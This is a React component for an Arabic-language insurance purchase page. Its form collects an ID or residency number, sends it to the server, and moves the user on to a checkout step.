import { useState, useEffect, useContext } from "react";
import { handleSubmitTab } from "@/lib/actions";
import { useNavigate } from "react-router-dom";
import CustomInput from "../CustomInput";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { UserStatusContext } from "@/context/userStatus";

const PartyComp = () => {
  const [error, setError] = useState({});
  const navigate = useNavigate();
  const { isLoggedIn } = useContext(UserStatusContext);

  const handleSubmit = (e: any) => {
    if (!isLoggedIn) return navigate("/login");

    const data = handleSubmitTab(e, setError);
    console.log(data);

    if (data)
      sendDataToServer({
        data,
        current: "الرئيسية",
        nextPage: "الخطوة الأولى",
        nextPageLink: "/checkout/1",
        navigate,
        waitingForAdminResponse: false,
        state: data,
      });
  };

  useEffect(() => {
    setCurrentPage("الرئيسية");
  }, []);

  return (
    <>
      <h1 className="py-4 text-xl font-bold">
        اشتر تأمين ضد الغير/شامل في دقائق
      </h1>

      <form onSubmit={handleSubmit}>
        <CustomInput
          error={error}
          setError={setError}
          label="رقم الهوية"
          placeholder="رقم الهوية أو الإقامة أو الشركة"
          id="id"
          type="tel"
          maxLength={10}
          tip={
            "يرجى إدخال بطاقة الهوية الخاصة بك للمواطنين أو بطاقة الإقامة للجنسيات الأخرى."
          }
        />

        <button
          className="capitalize w-full my-6 rounded-md font-bold py-3 px-6 bg-[#76b456] hover:bg-[#76b456]/90 text-white"
          type="submit"
        >
          اشتر الآن
        </button>
      </form>
    </>
  );
};
export default PartyComp;
